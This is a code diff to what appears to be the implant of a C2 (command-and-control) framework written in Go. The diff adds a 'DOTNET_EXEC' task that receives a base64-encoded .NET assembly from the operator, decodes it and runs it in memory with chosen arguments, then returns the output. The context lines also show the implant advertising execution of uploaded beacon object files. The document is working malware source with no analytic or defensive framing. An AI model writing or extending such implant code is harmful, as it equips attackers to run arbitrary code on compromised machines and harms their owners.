@@ -149,6 +149,34 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
+	case "DOTNET_EXEC":
+		// Args JSON: {"asm":"<base64>","args":"<string>","type":"<opt>","method":"<opt>"}
+		var da struct {
+			Asm    string `json:"asm"`
+			Args   string `json:"args"`
+			Type   string `json:"type"`
+			Method string `json:"method"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &da); err != nil {
+			t.sendResult(task.ID, "", "bad DOTNET_EXEC args: "+err.Error())
+			return
+		}
+		if da.Asm == "" {
+			t.sendResult(task.ID, "", "DOTNET_EXEC: asm field is empty")
+			return
+		}
+		asmBytes, err := base64.StdEncoding.DecodeString(da.Asm)
+		if err != nil {
+			t.sendResult(task.ID, "", "DOTNET_EXEC: base64 decode asm: "+err.Error())
+			return
+		}
+		output, err := ExecuteAssembly(asmBytes, da.Args, da.Type, da.Method)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, output, errStr)
+
 	case "BOF_LIST":
 		t.sendResult(task.ID, "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "")
 
